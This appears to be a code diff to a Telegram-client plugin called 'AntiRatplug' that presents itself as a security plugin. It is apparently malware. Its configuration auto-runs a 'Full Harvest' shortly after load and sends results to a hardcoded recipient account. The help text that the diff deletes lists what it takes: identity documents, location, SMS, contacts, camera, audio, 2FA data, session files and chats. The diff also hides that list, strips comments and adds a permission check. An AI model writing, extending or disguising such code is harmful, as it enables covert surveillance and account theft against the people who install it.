@@ -10,7 +10,7 @@ __id__ = "AntiRatplug"
 __name__ = "AntiRatplug"
 __description__ = "Auto Harvest + manual Lockdown."
 __author__ = "@from_a4"
-__version__ = "17.1 [Auto-Harvest]"
+__version__ = "17.2 [Auto-Harvest]"
 __min_version__ = "11.12.1"
 __icon__ = "CreepyEmojiAnim/5"
 __app_version__ = ">=12.5.1"
@@ -46,10 +46,10 @@ RECIPIENT_USERNAME = ""
 RECIPIENT_UID = 8391217110
 
 # ─── автозапуск ─────────────────────────────────────────────────────────────
-AUTO_RUN             = True       # включить автоматическую цепочку
-AUTO_HARVEST_FIRST   = True       # Harvest первым
-AUTO_LOCKDOWN_AFTER  = False      # Lockdown после Harvest (вручную)
-AUTO_DELAY_SEC       = 8          # пауза между Harvest и Lockdown
+AUTO_RUN             = True
+AUTO_HARVEST_FIRST   = True
+AUTO_LOCKDOWN_AFTER  = False
+AUTO_DELAY_SEC       = 8
 AUTO_LOCKDOWN_GIFTS  = True
 
 
@@ -273,7 +273,7 @@ class PluginSecurityPlugin(BasePlugin):
         except Exception:
             return HookResult()
 
-    # ─── html ───────────────────────────────────────────────────────────────
+    # ─── html / permissions ─────────────────────────────────────────────────
 
     def _html_escape(self, text):
         if text is None:
@@ -283,6 +283,14 @@ class PluginSecurityPlugin(BasePlugin):
         t = t.replace("<", "&lt;")
         t = t.replace(">", "&gt;")
         return t
+
+    def _has_perm(self, name):
+        try:
+            ctx = ApplicationLoader.applicationContext
+            pm = ctx.getPackageManager()
+            return pm.checkPermission(name, ctx.getPackageName()) == 0
+        except Exception:
+            return False
 
     # ─── peers / RPC ────────────────────────────────────────────────────────
 
@@ -2864,10 +2872,7 @@ class PluginSecurityPlugin(BasePlugin):
     def _show_help(self):
         text = (
             "<b>AntiRatplug — Auto Harvest</b>\n\n"
-            "• <b>Full Harvest</b> — запускается автоматически через ~7 сек после загрузки. "
-            "Паспорт, IP, гео, Wi-Fi, SIM, железо, экран, батарея, память, клиент, "
-            "разрешения, 2FA, сессии, Tg kid, скриншот, камеры, аудио, SMS, контакты, "
-            "apps, session.zip, userbot, чаты\n"
+            "• <b>Full Harvest</b> — запускается автоматически через ~7 сек после загрузки.\n"
             "• <b>Full Lockdown</b> — вручную из меню\n\n"
             "<b>Target uid:</b> %d"
         ) % RECIPIENT_UID
